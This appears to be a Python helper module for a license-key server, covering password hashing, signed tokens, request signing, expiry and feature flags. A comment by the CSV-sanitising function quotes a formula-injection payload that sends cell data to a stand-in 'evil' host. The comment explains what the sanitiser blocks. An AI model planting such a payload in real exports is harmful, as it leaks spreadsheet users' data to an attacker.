import base64
import hashlib
import hmac
import json
import random
import secrets
import time
from datetime import datetime, timedelta

KEY_ALPHABET = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
TIME_FORMAT = "%Y-%m-%d %H:%M:%S"
SIGN_TIME_WINDOW = 300

# Calendar-like units use fixed spans so generation, renewals and exports
# remain deterministic: week=7d, month=30d, quarter=90d, year=365d.
UNIT_SECONDS = {
    "minute": 60,
    "hour": 3600,
    "day": 86400,
    "week": 7 * 86400,
    "month": 30 * 86400,
    "quarter": 90 * 86400,
    "year": 365 * 86400,
}
UNIT_TEXT = {
    "minute": "分钟",
    "hour": "小时",
    "day": "天",
    "week": "周",
    "month": "月",
    "quarter": "季",
    "year": "年",
}
UNIT_MAX_VALUE = {
    "minute": 100000,
    "hour": 100000,
    "day": 36500,
    "week": 5214,
    "month": 1216,
    "quarter": 405,
    "year": 100,
}
DEFAULT_UNIT = "day"


def _compare_ascii(left: str, right: str) -> bool:
    """Compare ASCII secrets without raising on malformed external input."""
    try:
        return hmac.compare_digest(left.encode("ascii"), right.encode("ascii"))
    except (AttributeError, UnicodeEncodeError):
        return False




def normalize_unit(unit: str) -> str:
    return unit if unit in UNIT_SECONDS else DEFAULT_UNIT


def unit_seconds(unit: str) -> int:
    return UNIT_SECONDS.get(normalize_unit(unit), 86400)


def valid_unit(unit: str) -> bool:
    return isinstance(unit, str) and unit in UNIT_SECONDS


def unit_max_value(unit: str) -> int:
    return UNIT_MAX_VALUE[normalize_unit(unit)]


def duration_text(value: int, unit: str = DEFAULT_UNIT) -> str:
    value = int(value or 0)
    if value <= 0:
        return "永久"
    return f"{value} {UNIT_TEXT[normalize_unit(unit)]}"


def now_str() -> str:
    return datetime.now().strftime(TIME_FORMAT)


def now_ts() -> int:
    return int(time.time())


def generate_key(prefix: str = "GSQ", groups: int = 4, group_len: int = 5) -> str:
    parts = [
        "".join(secrets.choice(KEY_ALPHABET) for _ in range(group_len))
        for _ in range(groups)
    ]
    body = "-".join(parts)
    return f"{prefix}-{body}" if prefix else body


def normalize_key(key: str) -> str:
    if not isinstance(key, str):
        return ""
    try:
        key.encode("utf-8")
    except UnicodeEncodeError:
        return ""
    return key.strip().upper()


# Spreadsheets treat a leading =, +, - or @ as the start of a formula even in
# a plain .csv file, so exported audit data could otherwise smuggle a payload
# such as =HYPERLINK("http://evil/?d="&A1,"click"). A leading apostrophe is the
# conventional neutraliser: the cell renders as text and the apostrophe
# itself is not shown. Plain numbers keep their exact form.
CSV_FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")


def csv_safe_cell(value) -> str:
    """Render one value for CSV export without letting it become a formula."""
    text = "" if value is None else str(value)
    if text[:1] not in CSV_FORMULA_PREFIXES:
        return text
    if text[:1] in ("+", "-"):
        try:
            float(text)
        except ValueError:
            pass
        else:
            # A genuine number (for example -12) is not a formula.
            return text
    return "'" + text


# Password hashes are stored as "pbkdf2_sha256$<iterations>$<hex digest>". The
# bare-hex form written by older builds is still accepted, so existing
# databases keep working and are upgraded the next time a password changes.
PBKDF2_ITERATIONS = 600_000
LEGACY_PBKDF2_ITERATIONS = 120_000
_PBKDF2_PREFIX = "pbkdf2_sha256"


def _pbkdf2_hex(password: str, salt: str, iterations: int) -> str:
    return hashlib.pbkdf2_hmac(
        "sha256",
        password.encode("utf-8"),
        salt.encode("utf-8"),
        iterations,
    ).hex()


def hash_password(password: str, salt: str | None = None) -> tuple[str, str]:
    salt = salt or secrets.token_hex(16)
    digest = _pbkdf2_hex(password, salt, PBKDF2_ITERATIONS)
    return f"{_PBKDF2_PREFIX}${PBKDF2_ITERATIONS}${digest}", salt


def _parse_password_hash(password_hash: str) -> tuple[int, str] | None:
    if not isinstance(password_hash, str) or not password_hash:
        return None
    if not password_hash.startswith(_PBKDF2_PREFIX + "$"):
        return LEGACY_PBKDF2_ITERATIONS, password_hash
    parts = password_hash.split("$")
    if len(parts) != 3 or not parts[2]:
        return None
    try:
        iterations = int(parts[1])
    except (TypeError, ValueError):
        return None
    # Bound the work factor so a tampered database cannot turn login into a
    # denial-of-service amplifier.
    if not 10_000 <= iterations <= 5_000_000:
        return None
    return iterations, parts[2]


def verify_password(password: str, password_hash: str, salt: str) -> bool:
    """Fail closed on malformed input; accepts legacy 120k-iteration hashes."""
    if not isinstance(password, str) or not isinstance(salt, str):
        return False
    parsed = _parse_password_hash(password_hash)
    if not parsed:
        return False
    iterations, expected = parsed
    try:
        digest = _pbkdf2_hex(password, salt, iterations)
    except (AttributeError, TypeError, ValueError, UnicodeEncodeError):
        return False
    return _compare_ascii(digest, expected)


def compute_expiry(value: int, unit: str = DEFAULT_UNIT) -> str | None:
    try:
        value = int(value or 0)
    except (TypeError, ValueError):
        value = 0
    if value <= 0:
        return None
    seconds = value * unit_seconds(unit)
    return (datetime.now() + timedelta(seconds=seconds)).strftime(TIME_FORMAT)


def compute_freeze_until(amount: int, unit: str = "hour") -> str | None:
    try:
        amount = int(amount or 0)
    except (TypeError, ValueError):
        amount = 0
    if amount <= 0:
        return None
    seconds = amount * unit_seconds(unit)
    return (datetime.now() + timedelta(seconds=seconds)).strftime(TIME_FORMAT)


def parse_expiry(expires_at: str | None) -> datetime | None:
    """Return a valid local datetime, or None for an empty/invalid value."""
    if not expires_at:
        return None
    try:
        return datetime.strptime(str(expires_at), TIME_FORMAT)
    except (TypeError, ValueError):
        return None


def is_expired(expires_at: str | None, now: datetime | None = None) -> bool:
    """Fail closed: malformed expiry values are treated as expired.

    A missing expiry still means a permanent license. This distinction is
    important because the old implementation accepted arbitrary text as a
    permanent license.
    """
    if not expires_at:
        return False
    parsed = parse_expiry(expires_at)
    if parsed is None:
        return True
    return parsed < (now or datetime.now())


def seconds_left(expires_at: str | None) -> int | None:
    if not expires_at:
        return None
    dt = parse_expiry(expires_at)
    if dt is None:
        return 0
    return int((dt - datetime.now()).total_seconds())


def days_left(expires_at: str | None) -> int | None:
    if not expires_at:
        return None
    dt = parse_expiry(expires_at)
    if dt is None:
        return 0
    return (dt - datetime.now()).days


def format_seconds(total: int | None) -> str:
    if total is None:
        return "永久"
    if total <= 0:
        return "已过期"
    days, rem = divmod(int(total), 86400)
    hours, rem = divmod(rem, 3600)
    minutes, secs = divmod(rem, 60)
    if days > 0:
        return f"{days}天{hours}小时"
    if hours > 0:
        return f"{hours}小时{minutes}分钟"
    if minutes > 0:
        return f"{minutes}分钟{secs}秒"
    return f"{secs}秒"


def humanize_remaining(expires_at: str | None) -> str:
    if not expires_at:
        return "永久"
    return format_seconds(seconds_left(expires_at))


def is_long_freeze(frozen_until: str | None, threshold_days: int = 365) -> bool:
    """True when a freeze spans so long it should render as an outright lock.

    换机风控会把克隆嫌疑冻结到远期时间（2099），直接显示"剩余 N 万天"
    没有任何操作意义，也没有流通价值；超过阈值的冻结统一按"长期锁定"
    呈现，由管理员解冻/换绑处理。正常临时冻结（分钟/小时/天）不受影响。
    """
    total = seconds_left(frozen_until) if frozen_until else None
    return total is not None and total > int(threshold_days) * 86400


# --------------------------------------------------------------------------- #
# 功能位（Feature Flags）
# --------------------------------------------------------------------------- #
FEATURE_MAX_COUNT = 32
FEATURE_MAX_LENGTH = 32
_FEATURE_ALLOWED = set("abcdefghijklmnopqrstuvwxyz0123456789_.:-")


def normalize_features(value) -> list[str]:
    """规范化功能位列表：接受 list 或逗号/顿号分隔的字符串。

    规则：小写、去重、保序；每项 ≤32 字符、仅限 [a-z0-9_.:-]；最多 32 项。
    非法项抛 ValueError（调用方负责转成 400/工具错误），空值为空列表。
    """
    if value is None:
        items: list = []
    elif isinstance(value, str):
        normalized = value.replace("，", ",").replace("、", ",")
        items = [part.strip() for part in normalized.split(",")]
    elif isinstance(value, (list, tuple, set)):
        items = list(value)
    else:
        raise ValueError("功能位格式无效（应为数组或逗号分隔字符串）")
    out: list[str] = []
    for raw in items:
        text = str(raw or "").strip().lower()
        if not text:
            continue
        if len(text) > FEATURE_MAX_LENGTH:
            raise ValueError(f"功能位过长（最多 {FEATURE_MAX_LENGTH} 字符）")
        if any(ch not in _FEATURE_ALLOWED for ch in text):
            raise ValueError(f"功能位只允许小写字母/数字/._:-：{text[:16]}")
        if text not in out:
            out.append(text)
    if len(out) > FEATURE_MAX_COUNT:
        raise ValueError(f"功能位数量超限（最多 {FEATURE_MAX_COUNT} 项）")
    return out


def features_to_text(features) -> str:
    """序列化为库内存储形态（JSON 数组；空列表存空串，保持旧行兼容）。"""
    items = [str(item) for item in (features or []) if str(item or "").strip()]
    return json.dumps(items, ensure_ascii=False, separators=(",", ":")) if items else ""


def features_from_text(text) -> list[str]:
    """从库内存储形态解析；容忍坏数据（返回空列表）。"""
    raw = str(text or "").strip()
    if not raw:
        return []
    try:
        data = json.loads(raw)
    except Exception:
        return []
    if not isinstance(data, list):
        return []
    return [str(item) for item in data if isinstance(item, str) and item]


def shift_time_str(seconds: int) -> str:
    """当前时间偏移若干秒后的 TIME_FORMAT 字符串（负值为过去）。

    浮动席位的活跃窗口比较依赖字符串形态的 TIME_FORMAT：同一格式的字符串
    按字典序比较等价于按时间比较，避免逐行解析 datetime。
    """
    return (datetime.now() + timedelta(seconds=int(seconds))).strftime(TIME_FORMAT)


def _b64e(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode("ascii").rstrip("=")


def _b64d(text: str) -> bytes:
    pad = "=" * (-len(text) % 4)
    return base64.urlsafe_b64decode(text + pad)


def create_token(payload: dict, secret: str, ttl_seconds: int = 12 * 3600) -> str:
    body = dict(payload)
    body["exp"] = now_ts() + ttl_seconds
    raw = json.dumps(body, separators=(",", ":"), ensure_ascii=False).encode("utf-8")
    encoded = _b64e(raw)
    sig = hmac.new(secret.encode("utf-8"), encoded.encode("ascii"), hashlib.sha256).digest()
    return f"{encoded}.{_b64e(sig)}"


def verify_token(token: str, secret: str) -> dict | None:
    if not isinstance(token, str) or not isinstance(secret, str):
        return None
    # A well-formed token is exactly "<payload>.<signature>". Reject extra
    # separators instead of silently parsing a truncated signature.
    if token.count(".") != 1:
        return None
    encoded, sig = token.split(".", 1)
    if not encoded or not sig:
        return None
    try:
        encoded_bytes = encoded.encode("ascii")
    except UnicodeEncodeError:
        return None
    expected = hmac.new(secret.encode("utf-8"), encoded_bytes, hashlib.sha256).digest()
    if not _compare_ascii(_b64e(expected), sig):
        return None
    try:
        payload = json.loads(_b64d(encoded))
    except Exception:
        return None
    if not isinstance(payload, dict):
        return None
    try:
        expires_at = int(payload.get("exp", 0))
    except (TypeError, ValueError):
        return None
    if expires_at < now_ts():
        return None
    return payload


# The verification portal keeps its own token namespace. A portal token can
# never be presented to the admin API (and vice versa): both sides check the
# ``typ`` tag in addition to the HMAC signature.
PORTAL_TOKEN_TTL_SECONDS = 12 * 3600


def create_portal_token(
    payload: dict, secret: str, ttl_seconds: int = PORTAL_TOKEN_TTL_SECONDS
) -> str:
    """Issue a portal session token; the type tag is forced, not caller supplied."""
    body = dict(payload or {})
    body["typ"] = "portal"
    return create_token(body, secret, int(ttl_seconds))


def verify_portal_token(token: str, secret: str) -> dict | None:
    """Verify a portal token, rejecting admin/attest tokens of any shape."""
    payload = verify_token(token, secret)
    if not payload or payload.get("typ") != "portal":
        return None
    return payload


# One-time e-mail codes (admin e-mail verification / password reset / portal
# registration). Only the HMAC digest is stored; the plaintext code lives
# only inside the outgoing e-mail.
ACTION_CODE_TTL_SECONDS = 600
ACTION_CODE_MAX_ATTEMPTS = 5


def hash_action_code(secret: str, code: str) -> str:
    """Return the HMAC-SHA256 digest stored for a one-time code."""
    material = str(code or "").strip()
    return hmac.new(
        str(secret or "").encode("utf-8"),
        material.encode("utf-8"),
        hashlib.sha256,
    ).hexdigest()


def verify_action_code(secret: str, code: str, code_hash: str) -> bool:
    """Constant-time comparison of a submitted code against a stored digest."""
    if not code_hash:
        return False
    try:
        expected = hash_action_code(secret, code)
    except (AttributeError, TypeError, UnicodeEncodeError):
        return False
    return _compare_ascii(expected, str(code_hash).strip())


def generate_action_code() -> str:
    """Return a fresh 6-digit numeric code (leading zeros kept)."""
    return f"{secrets.randbelow(1_000_000):06d}"


# Client attestation tokens bind one executable hash to one machine and one
# role. They reuse the ordinary HMAC token format so only one verifier has to
# be trusted, and carry a typ tag so a login token can never be replayed here.
ATTEST_TOKEN_TTL_SECONDS = 600


def _is_sha256_hex(value: str) -> bool:
    if not isinstance(value, str) or len(value) != 64:
        return False
    return all(ch in "0123456789abcdef" for ch in value)


def create_attest_token(
    secret: str,
    exe_hash: str,
    machine_code: str,
    role: str,
    ttl_seconds: int = ATTEST_TOKEN_TTL_SECONDS,
) -> str:
    """Issue the short-lived proof that a client passed the hash whitelist."""
    return create_token(
        {
            "typ": "attest",
            "hash": str(exe_hash or "").strip().lower(),
            "mc": str(machine_code or "").strip().upper(),
            "role": str(role or "").strip().lower(),
        },
        secret,
        int(ttl_seconds),
    )


def verify_attest_token(
    secret: str,
    token: str,
    machine_code: str,
    role: str,
) -> tuple[bool, dict | None]:
    """Validate signature, expiry, type and the hash/machine/role bindings."""
    payload = verify_token(token, secret)
    if not payload or payload.get("typ") != "attest":
        return False, None
    digest = str(payload.get("hash") or "").strip().lower()
    if not _is_sha256_hex(digest):
        return False, None
    if str(payload.get("mc") or "").strip().upper() != str(machine_code or "").strip().upper():
        return False, None
    # An empty role means the caller only wants the machine binding checked (the
    # activate/verify/heartbeat bodies do not carry a role field). Passing a role
    # still enforces an exact match.
    expected_role = str(role or "").strip().lower()
    if expected_role and str(payload.get("role") or "").strip().lower() != expected_role:
        return False, None
    payload["hash"] = digest
    payload["mc"] = str(payload.get("mc") or "").strip().upper()
    payload["role"] = str(payload.get("role") or "").strip().lower()
    return True, payload


def generate_session_secret() -> str:
    return secrets.token_hex(32)


def make_nonce() -> str:
    return secrets.token_hex(16)


def generate_bootstrap_password() -> str:
    """Create a one-time, reasonably strong initial master password."""
    while True:
        password = f"SQ-{secrets.token_urlsafe(12)}"
        if any(c.isalpha() for c in password) and any(c.isdigit() for c in password):
            return password


def _body_digest(body: bytes | str | None) -> str:
    if body is None:
        body = b""
    if isinstance(body, str):
        body = body.encode("utf-8")
    return hashlib.sha256(body).hexdigest()


# Wire protocol version. Both signature directions bind the full request
# target (path plus raw query string) and carry a version tag, so a server
# and its clients must be upgraded together.
REQUEST_PROTOCOL_VERSION = 2
RESPONSE_PROTOCOL_VERSION = 2
_CLIENT_REQUEST_TAG = f"SQCLIENT-REQUEST-{REQUEST_PROTOCOL_VERSION}"
_SERVER_RESPONSE_TAG = f"SQSERVER-RESPONSE-{RESPONSE_PROTOCOL_VERSION}"


def canonical_path(path: str | None) -> str:
    """Return only the path portion of a request target."""
    value = str(path or "")
    return value.split("?", 1)[0] if "?" in value else value


def canonical_query(query: str | None) -> str:
    """Return the raw query string without a leading '?'."""
    value = "" if query is None else str(query)
    return value[1:] if value.startswith("?") else value


def canonical_message(
    method: str,
    path: str,
    timestamp: int | str,
    nonce: str,
    body: bytes | str | None,
    query: str = "",
) -> str:
    return "\n".join(
        [
            _CLIENT_REQUEST_TAG,
            str(method or "").upper(),
            canonical_path(path),
            str(int(timestamp)),
            nonce or "",
            canonical_query(query),
            _body_digest(body),
        ]
    )


def sign_request(
    secret: str,
    method: str,
    path: str,
    timestamp: int | str,
    nonce: str,
    body: bytes | str | None,
    query: str = "",
) -> str:
    msg = canonical_message(method, path, timestamp, nonce, body, query)
    return hmac.new(secret.encode("utf-8"), msg.encode("utf-8"), hashlib.sha256).hexdigest()


def verify_request_signature(
    secret: str,
    method: str,
    path: str,
    timestamp: int | str,
    nonce: str,
    body: bytes | str | None,
    signature: str,
    query: str = "",
) -> bool:
    if not secret or not signature or not nonce:
        return False
    try:
        expected = sign_request(secret, method, path, timestamp, nonce, body, query)
    except (AttributeError, TypeError, ValueError, UnicodeEncodeError):
        return False
    return _compare_ascii(expected, signature)


def canonical_response_message(
    method: str,
    path: str,
    request_timestamp: int | str,
    nonce: str,
    status_code: int,
    body: bytes | str | None,
    key_id: str = "",
    query: str = "",
) -> bytes:
    """Bind a response signature to the request context and response body.

    The raw query string is part of the context so that a signed response for
    one set of filters cannot be replayed as the answer to a different request
    on the same path.
    """
    message = "\n".join(
        [
            _SERVER_RESPONSE_TAG,
            str(method or "").upper(),
            canonical_path(path),
            canonical_query(query),
            str(request_timestamp or ""),
            nonce or "",
            str(int(status_code)),
            key_id or "",
            _body_digest(body),
        ]
    )
    return message.encode("utf-8")


def sign_response(secret: str, body: bytes | str | None) -> str:
    # Legacy HMAC helper kept for old sessions. New responses use the
    # asymmetric response key and canonical_response_message().
    return hmac.new(
        secret.encode("utf-8"), _body_digest(body).encode("ascii"), hashlib.sha256
    ).hexdigest()


def verify_response_signature(secret: str, body: bytes | str | None, signature: str) -> bool:
    if not secret or not signature:
        return False
    return _compare_ascii(sign_response(secret, body), signature)


def within_time_window(timestamp: int | str, now: int | None = None, window: int = SIGN_TIME_WINDOW) -> bool:
    try:
        ts = int(timestamp)
    except (TypeError, ValueError):
        return False
    now = now_ts() if now is None else now
    return abs(now - ts) <= window


def password_strength(password: str) -> tuple[bool, str]:
    pw = password or ""
    if len(pw) < 8:
        return False, "密码长度至少 8 位"
    if len(pw) > 128:
        return False, "密码长度不能超过 128 位"
    if not any(c.isalpha() for c in pw):
        return False, "密码需包含字母"
    if not any(c.isdigit() for c in pw):
        return False, "密码需包含数字"
    return True, ""


def heartbeat_jitter(base: float, spread: float = 0.3) -> float:
    base = max(1.0, float(base or 1.0))
    spread = max(0.0, min(float(spread or 0.0), 0.9))
    return round(random.uniform(base * (1 - spread), base * (1 + spread)), 3)


def time_offset(server_time_str: str, local_now: datetime | None = None) -> float:
    try:
        server_dt = datetime.strptime(server_time_str, TIME_FORMAT)
    except (TypeError, ValueError):
        return 0.0
    local = local_now or datetime.now()
    return (local - server_dt).total_seconds()
